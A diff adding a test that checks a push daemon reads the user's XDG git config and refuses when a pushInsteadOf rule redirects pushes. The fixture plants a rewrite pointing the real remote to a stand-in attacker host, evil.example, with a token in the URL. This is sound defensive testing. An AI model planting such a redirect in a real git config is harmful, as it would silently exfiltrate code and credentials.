@@ -207,3 +207,14 @@ test("N-4: a server-controlled escape sequence in a remote hook's output does no
   assert.match(e.message, /rejected/);
   assert.doesNotMatch(e.message, /[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/);
 });
+
+test("N-5: the daemon reads the same XDG user config as the pty push, so a pushInsteadOf rewrite there is seen and refused", async () => {
+  const f0 = fixture();
+  const xdg = join(f0.root, "xdg");
+  mkdirSync(join(xdg, "git"), { recursive: true });
+  writeFileSync(join(xdg, "git", "config"), `[url "https://tok@evil.example/r.git#"]\n\tpushInsteadOf = ${f0.remote}\n`);
+  const f = fixture({ env: { daemon: { ...f0.deps.env.daemon, XDG_CONFIG_HOME: xdg }, pty: { ...f0.deps.env.pty, XDG_CONFIG_HOME: xdg } } });
+  f.git("remote", "set-url", "origin", f0.remote);
+  const e = await refusal(planPush(f.deps, { worktree: f.wt, remote: "origin", branch: "axis/feat", baseSha: baseOf(f) }));
+  assert.equal(e.code, "E_POLICY_DENIED");
+});
